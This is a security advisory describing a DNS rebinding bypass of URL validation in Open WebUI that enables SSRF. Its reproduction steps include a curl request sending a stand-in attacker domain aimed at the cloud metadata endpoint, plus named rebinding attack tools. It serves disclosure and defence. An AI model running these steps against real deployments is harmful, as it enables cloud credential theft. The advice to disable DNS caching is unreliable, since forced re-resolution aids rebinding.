# Vulnerability Report: DNS Rebinding in URL Validation
## ADDITIONAL FINDING — Open WebUI

---

**Title:** DNS Rebinding Bypass in URL Validation Enables SSRF to Internal Services

**Severity:** High (CVSS 7.7 — AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Affected Component:**
- Repository: https://github.com/open-webui/open-webui
- File: `backend/open_webui/retrieval/web/utils.py` (lines 93-103)
- Affected endpoints: All endpoints using `validate_url()` for SSRF protection

**Weakness:** CWE-918 (Server-Side Request Forgery), CWE-350 (Trust of Untrusted Data)

---

## Summary

The `validate_url()` function mitigates SSRF by resolving hostnames and checking if resolved IP addresses are private/internal. However, this check is vulnerable to **DNS rebinding attacks** — a TOCTOU (Time-of-Check-Time-of-Use) race condition where the DNS resolution during validation returns a safe public IP, but the DNS resolution during the actual HTTP request resolves to an internal/private IP.

**The developers themselves acknowledge this vulnerability** in a code comment at line 99:
```python
# This is technically still vulnerable to DNS rebinding attacks, as we don't control WebBaseLoader
```

---

## Technical Details

### Vulnerable Code (utils.py:93-103)

```python
if not ENABLE_RAG_LOCAL_WEB_FETCH:
    parsed_url = urllib.parse.urlparse(url)
    # Get IPv4 and IPv6 addresses
    ipv4_addresses, ipv6_addresses = resolve_hostname(parsed_url.hostname)
    # Check if any of the resolved addresses are private
    # This is technically still vulnerable to DNS rebinding attacks, as we don't control WebBaseLoader
    for ip in ipv4_addresses + ipv6_addresses:
        addr = ipaddress.ip_address(ip)
        if not addr.is_global:
            raise ValueError(ERROR_MESSAGES.INVALID_URL)
```

### Attack Mechanism

1. **Attacker controls a DNS server** (e.g., `attacker.com`)

2. **DNS server configuration:**
   - First resolution of `rebind.attacker.com` → `8.8.8.8` (public IP, passes validation)
   - Second resolution (after TTL=0 or very short TTL) → `169.254.169.254` (AWS IMDS)

3. **Attack flow:**
   ```
   Step 1: validate_url("http://rebind.attacker.com/steal-creds")
     → DNS resolves to 8.8.8.8 (public) → PASSES validation
   
   Step 2: HTTP client fetches "http://rebind.attacker.com/steal-creds"
     → DNS resolves to 169.254.169.254 (internal) → SSRF succeeds
   ```

4. **Result:** Server makes HTTP request to AWS IMDS, internal services, or other protected resources.

### Attack Tools

Several tools exist for DNS rebinding:
- **Singularity** (https://github.com/nccgroup/singularity) — automated DNS rebinding attack framework
- **rebinder** (https://github.com/ctxis/rebound) — simple rebinding tool
- **1u.ms** — wildcard DNS service for rebinding (`make-127.0.0.1-rebind.1u.ms` resolves to `127.0.0.1`)

---

## Steps to Reproduce

1. Set up a DNS rebinding server (using Singularity or similar):
   ```bash
   git clone https://github.com/nccgroup/singularity.git
   cd singularity
   # Configure to rebind between public IP and 169.254.169.254
   ```

2. Deploy Open WebUI with `ENABLE_RAG_LOCAL_WEB_FETCH=false` (default):
   ```bash
   docker run -d -p 3000:8080 ghcr.io/open-webui/open-webui:main
   ```

3. As an authenticated user, trigger a web fetch to the rebinding domain:
   ```bash
   # Via knowledge base URL import
   curl -X POST 'http://localhost:3000/api/v1/retrieval/process/web' \
     -H 'Authorization: Bearer <TOKEN>' \
     -H 'Content-Type: application/json' \
     -d '{"url": "http://rebind.attacker.com/latest/meta-data/"}'
   ```

4. The validation check resolves `rebind.attacker.com` to the public IP (passes).

5. The subsequent HTTP request resolves to `169.254.169.254` (AWS IMDS).

6. The IMDS response is returned and processed by the server.

---

## Impact

- **Cloud credential theft:** Access AWS/GCP/Azure instance metadata for temporary credentials
- **Internal network access:** Scan and interact with internal services
- **Bypasses ALL `validate_url()` protections:** Every endpoint using this function is affected
- **Wide attack surface:** Affects web retrieval, knowledge base imports, and any future URL validation

---

## Remediation

1. **Pin DNS resolution:** Resolve the hostname once and use the resolved IP for the HTTP request (not the hostname):
   ```python
   import socket
   resolved_ip = socket.gethostbyname(hostname)
   # Make request to IP, with Host header set to original hostname
   ```

2. **Use a URL-aware HTTP client** that resolves DNS once and validates the IP before connecting.

3. **Disable DNS caching** in the HTTP client to force re-resolution (makes rebinding harder but doesn't eliminate it).

4. **Use a network-level guard:** Block outbound traffic to private IP ranges at the firewall/iptables level:
   ```bash
   iptables -A OUTPUT -d 169.254.0.0/16 -j DROP
   iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
   iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
   iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
   ```

5. **Short-term:** Add a warning in documentation that `ENABLE_RAG_LOCAL_WEB_FETCH=false` does not fully protect against SSRF.

---

## References
- CWE-350: Trust of Untrusted Data
- CWE-918: Server-Side Request Forgery
- Singularity DNS Rebinding: https://github.com/nccgroup/singularity
- Taviso's rbndr tool: https://github.com/taviso/rbndr

---

*Found during code review of open-webui/open-webui, 2026-05-11. Note: The developers acknowledge this vulnerability in a code comment.*
